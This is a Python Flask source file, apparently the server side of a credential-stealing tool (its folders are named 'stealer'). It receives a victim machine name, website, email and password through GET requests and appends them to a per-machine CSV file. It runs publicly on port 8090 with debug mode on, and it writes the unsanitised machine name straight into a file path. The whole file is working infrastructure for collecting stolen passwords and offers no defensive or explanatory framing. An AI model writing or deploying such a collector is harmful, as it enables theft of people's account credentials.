import os
import json
from re import L

from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder=os.getcwd()+"/stealer/web/templates/", static_folder=os.getcwd()+"/stealer/web/static/")


@app.route("/")
def index():
    print(request.args.get("pcname"), request.args.get("key"))
    return render_template("index.html")

@app.route("/password", methods=["GET", "POST"])
def passwords():

    if request.method == 'GET':

        pcName = request.args.get("pcname")
        email = request.args.get("email")
        password = request.args.get("password")
        website = request.args.get("website")

        if pcName is None:
            pcName = "undefined"
        
        if email is None:
            email = "undefined"
        
        if password is None:
            password = "undefined"
        
        if website is None:
            website = "undefined"

        if not(f"{pcName}.csv" in os.listdir()):
            with open(f"{pcName}.csv", "w", encoding="utf-8") as temp:
                temp.write('''"website","email","password"''')

        with open(f"{pcName}.csv", "r", encoding="utf-8") as fr:
            frd = fr.readlines()

        for line in frd:
            splitted = line.split(",")
            if splitted[0].strip() == '"' + str(website) + '"':
                if splitted[1].strip() == '"' + str(email) + '"':
                    return render_template("password.html")  
       
        with open(f"{pcName}.csv", "a", encoding="utf-8") as fw:
            fw.write(f'''\n"{website}","{email}","{password}"''')

        return render_template("password.html")  


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8090, debug=True)
